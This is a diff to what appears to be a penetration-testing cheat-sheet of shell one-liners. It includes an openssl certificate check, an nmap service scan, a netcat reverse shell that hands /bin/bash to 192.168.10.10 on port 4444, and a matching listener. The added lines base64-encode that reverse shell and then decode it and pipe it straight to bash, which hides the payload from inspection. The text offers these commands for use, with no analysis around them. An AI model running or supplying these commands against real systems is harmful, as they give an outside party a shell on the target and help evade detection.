@@ -3,3 +3,5 @@ openssl s_client -connect 192.168.0.102:443 -showcerts ( ssl checker)
 nmap -sT -v 192.168.0.102 -sC -sV  -T4
 nc -e /bin/bash 192.168.10.10 4444 
 nc -lvnp 4444
+echo 'nc -e /bin/bash 192.168.10.10 4444' | base64 (put_your_encoded_string_here)
+echo 'put_your_encoded_string_here' | base64 -d | bash
